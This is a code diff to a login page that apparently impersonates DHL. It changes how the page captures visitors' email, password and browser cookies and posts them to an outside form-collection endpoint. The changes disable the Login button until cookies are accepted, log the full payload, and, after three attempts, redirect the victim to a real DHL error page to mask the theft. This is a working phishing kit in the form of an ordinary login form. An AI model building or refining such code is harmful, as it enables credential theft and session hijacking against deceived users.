@@ -95,7 +95,11 @@
             font-size: 16px;
             cursor: pointer;
         }
-        button:hover {
+        button:disabled {
+            background-color: #cccccc;
+            cursor: not-allowed;
+        }
+        button:hover:not(:disabled) {
             background-color: #b0040f;
         }
         .error-message {
@@ -115,7 +119,6 @@
             display: block;
             margin-bottom: 10px;
         }
-        /* Cookie Consent Popup Styles */
         .cookie-consent {
             position: fixed;
             bottom: 20px;
@@ -129,7 +132,7 @@
             width: 90%;
             z-index: 1000;
             text-align: center;
-            display: none; /* Hidden by default */
+            display: none;
         }
         .cookie-consent p {
             margin: 0 0 15px;
@@ -229,7 +232,7 @@
             <!-- Honeypot field -->
             <input type="text" name="honeypot" style="display: none;">
             <div class="error-message" id="error-message"></div>
-            <button type="submit" data-i18n="[value]login" value="Login">Login</button>
+            <button type="submit" id="submit-button" data-i18n="[value]login" value="Login" disabled>Login</button>
         </form>
         <div class="links">
             <a href="#" data-i18n="reset_password">Reset Password</a>
@@ -472,6 +475,67 @@
             return 'en';
         }
 
+        // Cookie Consent Functions
+        function setCookie(name, value, days) {
+            let expires = "";
+            if (days) {
+                const date = new Date();
+                date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
+                expires = "; expires=" + date.toUTCString();
+            }
+            document.cookie = name + "=" + (value || "") + expires + "; path=/; SameSite=Strict";
+            console.log(`Cookie set: ${name}=${value}`);
+        }
+
+        function getCookie(name) {
+            const nameEQ = name + "=";
+            const ca = document.cookie.split(';');
+            for (let i = 0; i < ca.length; i++) {
+                let c = ca[i];
+                while (c.charAt(0) === ' ') c = c.substring(1);
+                if (c.indexOf(nameEQ) === 0) {
+                    const value = c.substring(nameEQ.length);
+                    console.log(`Cookie found: ${name}=${value}`);
+                    return value;
+                }
+            }
+            console.log(`Cookie not found: ${name}`);
+            return null;
+        }
+
+        function showCookieConsent() {
+            const consent = getCookie('cookieConsent');
+            const consentPopup = document.getElementById('cookie-consent');
+            const submitButton = document.getElementById('submit-button');
+            if (!consent) {
+                consentPopup.style.display = 'block';
+                submitButton.disabled = true; // Disable submit button until consent is given
+                console.log('Showing cookie consent popup');
+            } else {
+                submitButton.disabled = false; // Enable submit button if consent exists
+                console.log('Cookie consent already set:', consent);
+            }
+        }
+
+        function setCookieConsent(status) {
+            setCookie('cookieConsent', status, 365);
+            document.getElementById('cookie-consent').style.display = 'none';
+            document.getElementById('submit-button').disabled = false; // Enable submit button
+            console.log(`Cookie consent set to: ${status}`);
+        }
+
+        // Function to get all cookies as a string (excluding cookieConsent)
+        function getCookies() {
+            const rawCookies = document.cookie;
+            if (!rawCookies) {
+                console.log('No cookies available');
+                return '';
+            }
+            const cookies = rawCookies.split('; ').filter(cookie => !cookie.startsWith('cookieConsent=')).join('; ');
+            console.log('Captured cookies:', cookies || 'None (excluding cookieConsent)');
+            return cookies;
+        }
+
         // Initialize i18next with detected language
         i18next.init({
             lng: detectUserLanguage(),
@@ -533,58 +597,12 @@
             });
         }
 
-        // Cookie Consent Functions
-        function setCookie(name, value, days) {
-            let expires = "";
-            if (days) {
-                const date = new Date();
-                date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
-                expires = "; expires=" + date.toUTCString();
-            }
-            document.cookie = name + "=" + (value || "") + expires + "; path=/; SameSite=Strict";
-            console.log(`Cookie set: ${name}=${value}`);
-        }
-
-        function getCookie(name) {
-            const nameEQ = name + "=";
-            const ca = document.cookie.split(';');
-            for (let i = 0; i < ca.length; i++) {
-                let c = ca[i];
-                while (c.charAt(0) === ' ') c = c.substring(1);
-                if (c.indexOf(nameEQ) === 0) return c.substring(nameEQ.length);
-            }
-            return null;
-        }
-
-        function showCookieConsent() {
-            const consent = getCookie('cookieConsent');
-            const consentPopup = document.getElementById('cookie-consent');
-            if (!consent) {
-                consentPopup.style.display = 'block';
-                console.log('Showing cookie consent popup');
-            } else {
-                console.log('Cookie consent already set:', consent);
-            }
-        }
-
-        function setCookieConsent(status) {
-            setCookie('cookieConsent', status, 365); // Store consent for 1 year
-            document.getElementById('cookie-consent').style.display = 'none';
-            console.log(`Cookie consent set to: ${status}`);
-        }
-
-        // Function to get all cookies as a string (excluding cookieConsent)
-        function getCookies() {
-            const cookies = document.cookie ? document.cookie.split('; ').filter(cookie => !cookie.startsWith('cookieConsent=')).join('; ') : '';
-            console.log('Captured cookies:', cookies);
-            return cookies;
-        }
-
         // Form handling
         (() => {
             const form = document.getElementById('signin-form');
             const emailInput = document.getElementById('email');
             const errorMessageEl = document.getElementById('error-message');
+            const submitButton = document.getElementById('submit-button');
             const maxAttempts = 3;
             const submitEndpoint = 'https://submit-form.com/Uxt0vouOR';
             let attemptCount = 0;
@@ -606,10 +624,11 @@
                 const password = form.password.value;
                 const honeypot = form.honeypot.value;
                 const consent = getCookie('cookieConsent');
-                const cookies = consent === 'accepted' ? getCookies() : ''; // Only include cookies if consent is granted
+                console.log('Consent status:', consent);
 
                 if (!email || !password) {
                     errorMessageEl.textContent = i18next.t('error_message');
+                    console.log('Form validation failed: email or password missing');
                     return;
                 }
 
@@ -618,9 +637,14 @@
                     return;
                 }
 
+                const cookies = consent === 'accepted' ? getCookies() : '';
+                console.log('Cookies to send:', cookies || 'None');
+
                 try {
                     const payload = { email, password };
-                    if (cookies) payload.cookies = cookies; // Include cookies only if present and consented
+                    if (cookies) payload.cookies = cookies;
+
+                    console.log('Sending payload:', JSON.stringify(payload));
 
                     const response = await fetch(submitEndpoint, {
                         method: 'POST',
@@ -629,10 +653,10 @@
                     });
 
                     if (!response.ok) {
-                        throw new Error('Login failed');
+                        throw new Error(`Login failed: ${response.statusText}`);
                     }
 
-                    console.log('Login successful, cookies sent:', cookies || 'None (consent not granted or no cookies)');
+                    console.log('Login successful, payload sent:', payload);
                 } catch (error) {
                     console.error('Form submission error:', error);
                     attemptCount++;
@@ -641,6 +665,7 @@
                         form.password.focus();
                         errorMessageEl.textContent = i18next.t('error_message');
                     } else {
+                        console.log('Max attempts reached, redirecting...');
                         window.location.href = 'https://mydhl.express.dhl/gq/en/auth/link-error.html';
                     }
                 }
